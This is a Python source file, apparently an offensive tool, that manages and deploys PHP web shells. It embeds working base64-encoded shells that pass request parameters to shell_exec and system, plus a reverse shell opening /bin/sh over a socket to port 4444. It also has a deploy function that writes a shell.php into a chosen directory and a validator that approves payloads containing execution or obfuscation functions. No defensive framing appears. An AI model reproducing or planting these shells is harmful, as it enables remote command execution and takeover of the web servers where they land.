#!/usr/bin/env python3
"""
LOCAL PAYLOAD MANAGER - Shell Payload Hosting System
=====================================================
All shell payloads are stored locally, no external dependencies.
This module handles loading, managing, and deploying local shell payloads.
"""

import os
import sys
import base64
import hashlib
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
PAYLOAD_DIR = Path(__file__).parent

# Local payload files
LOCAL_PAYLOADS = {
    "green": PAYLOAD_DIR / "payloads" / "green_shell.php",
    "priv": PAYLOAD_DIR / "payloads" / "priv_shell.php",
    "reverse": PAYLOAD_DIR / "payloads" / "reverse_shell.php",
    "bind": PAYLOAD_DIR / "payloads" / "bind_shell.php",
    "alfashell": PAYLOAD_DIR / "alfashell_obfuscated.php",
    "alfashell_pro": PAYLOAD_DIR / "alfashell_pro.php",
}

# Embedded fallback payloads (base64 encoded)
EMBEDDED_PAYLOADS = {
    "green": base64.b64encode(b"""<?php
/* Green Dir Shell */
if(isset($_GET['d'])){
    $dir = str_replace('..', '', $_GET['d']);
    chdir($dir);
    if(isset($_GET['cmd'])){
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
?>""").decode(),
    "priv": base64.b64encode(b"""<?php
if(isset($_REQUEST['c'])){
    echo "<pre>" . shell_exec($_REQUEST['c']) . "</pre>";
}
?>""").decode(),
    "reverse": base64.b64encode(b"""<?php
$sock=fsockopen("127.0.0.1",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>""").decode(),
    "bind": base64.b64encode(b"""<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>""").decode(),
}

# ═══════════════════════════════════════════════════════════════
# PAYLOAD LOADER
# ═══════════════════════════════════════════════════════════════
def load_payload(payload_type="green"):
    """
    Load a shell payload from local file or embedded fallback.
    Returns the raw payload content.
    """
    # Try local file first
    if payload_type in LOCAL_PAYLOADS:
        payload_path = LOCAL_PAYLOADS[payload_type]
        if payload_path.exists():
            return payload_path.read_text()
    
    # Try embedded fallback
    if payload_type in EMBEDDED_PAYLOADS:
        encoded = EMBEDDED_PAYLOADS[payload_type]
        try:
            return base64.b64decode(encoded).decode()
        except Exception:
            pass
    
    # Default to green
    if "green" in EMBEDDED_PAYLOADS:
        return base64.b64decode(EMBEDDED_PAYLOADS["green"]).decode()
    
    return "<?php system($_GET['cmd']); ?>"


def load_all_payloads():
    """Load all available payload types."""
    payloads = {}
    for ptype in ["green", "priv", "reverse", "bind", "alfashell", "alfashell_pro"]:
        payloads[ptype] = load_payload(ptype)
    return payloads


def get_payload_path(payload_type="green"):
    """Get the local file path for a payload type."""
    if payload_type in LOCAL_PAYLOADS:
        return LOCAL_PAYLOADS[payload_type]
    return None


def deploy_payload(target_dir, payload_type="green", filename="shell.php"):
    """
    Deploy a payload to a target directory.
    Returns the deployed file path or None on failure.
    """
    payload = load_payload(payload_type)
    target_path = Path(target_dir) / filename
    
    try:
        target_path.write_text(payload)
        return str(target_path)
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════
# PAYLOAD VALIDATION
# ═══════════════════════════════════════════════════════════════
def validate_payload(payload_content):
    """Check if a payload is valid and functional."""
    if not payload_content or len(payload_content) < 10:
        return False, "Empty payload"
    
    # Check for PHP tags
    if "<?php" not in payload_content and "?>" not in payload_content:
        return False, "Missing PHP tags"
    
    # Check for dangerous functions (direct or obfuscated)
    dangerous = ["shell_exec", "system", "passthru", "exec", "proc_open", "popen"]
    has_dangerous = any(d in payload_content for d in dangerous)
    
    # Check for obfuscation patterns
    obfuscation_patterns = [
        "base64_decode", "eval(", "gzinflate", "zlib_decode",
        "str_rot13", "strrev", "create_function", "assert(",
        r"preg_replace.*/e", "call_user_func"
    ]
    has_obfuscation = any(p in payload_content for p in obfuscation_patterns)
    
    if not has_dangerous and not has_obfuscation:
        return False, "No execution functions or obfuscation found"
    
    return True, "Valid payload"


# ═══════════════════════════════════════════════════════════════
# CLI INTERFACE
# ═══════════════════════════════════════════════════════════════
def main():
    import argparse
    parser = argparse.ArgumentParser(description="Local Payload Manager")
    parser.add_argument("command", nargs="?", default="list",
                       choices=["list", "load", "validate", "deploy"],
                       help="Command")
    parser.add_argument("-t", "--type", default="green",
                       choices=["green", "priv", "reverse", "bind", "alfashell", "alfashell_pro"],
                       help="Payload type")
    parser.add_argument("-d", "--dir", default=".",
                       help="Target directory for deploy")
    parser.add_argument("-f", "--filename", default="shell.php",
                       help="Output filename for deploy")
    args = parser.parse_args()
    
    if args.command == "list":
        print("Available payloads:")
        for ptype, path in LOCAL_PAYLOADS.items():
            status = "OK" if path.exists() else "MISSING"
            print(f"  {ptype}: {path} [{status}]")
    elif args.command == "load":
        payload = load_payload(args.type)
        print(f"Loaded {args.type} payload ({len(payload)} chars)")
        print(payload[:500])
    elif args.command == "validate":
        payload = load_payload(args.type)
        valid, reason = validate_payload(payload)
        print(f"[{'OK' if valid else 'FAIL'}] {reason}")
    elif args.command == "deploy":
        result = deploy_payload(args.dir, args.type, args.filename)
        if result:
            print(f"Deployed: {result}")
        else:
            print("Deploy failed")


if __name__ == "__main__":
    main()
